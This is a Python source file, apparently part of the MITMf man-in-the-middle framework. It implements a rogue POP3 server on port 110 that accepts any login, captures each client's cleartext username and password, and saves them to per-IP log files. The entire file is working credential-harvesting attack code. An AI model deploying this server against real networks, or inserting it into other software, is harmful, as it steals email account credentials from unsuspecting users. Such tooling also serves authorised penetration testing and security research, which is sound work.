import logging
import threading

from SocketServer import TCPServer, ThreadingMixIn, BaseRequestHandler
from core.responder.common import *
from core.responder.odict import OrderedDict
from core.responder.packet import Packet

mitmf_logger = logging.getLogger("mitmf")

class POP3Server():

	def start(self):
		try:
			mitmf_logger.debug("[POP3Server] online")
			server = ThreadingTCPServer(("0.0.0.0", 110), POP)
			t = threading.Thread(name="POP3Server", target=server.serve_forever)
			t.setDaemon(True)
			t.start()
		except Exception, e:
			mitmf_logger.error("[POP3Server] Error starting on port {}: {}".format(110, e))

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

	allow_reuse_address = 1

	def server_bind(self):
		TCPServer.server_bind(self)


class POPOKPacket(Packet):
	fields = OrderedDict([
		("Code",           "+OK"),
		("CRLF",      "\r\n"),
	])

#POP3 server class.
class POP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(POPOKPacket()))
			data = self.request.recv(1024)
			if data[0:4] == "USER":
				User = data[5:].replace("\r\n","")
				mitmf_logger.info('[+]POP3 User: %s'%(User))
				t = POPOKPacket()
				self.request.send(str(t))
				data = self.request.recv(1024)
			if data[0:4] == "PASS":
				Pass = data[5:].replace("\r\n","")
				Outfile = "./logs/responder/POP3-Clear-Text-Password-"+self.client_address[0]+".txt"
				WriteData(Outfile,User+":"+Pass, User+":"+Pass)
				mitmf_logger.info("[POP3Server] POP3 Credentials from {}. User/Pass: {}:{} ".format(self.client_address[0],User,Pass))
				t = POPOKPacket()
				self.request.send(str(t))
				data = self.request.recv(1024)
			else :
				t = POPOKPacket()
				self.request.send(str(t))
				data = self.request.recv(1024)
		except Exception as e:
			mitmf_logger.error("[POP3Server] Error handling request: {}".format(e))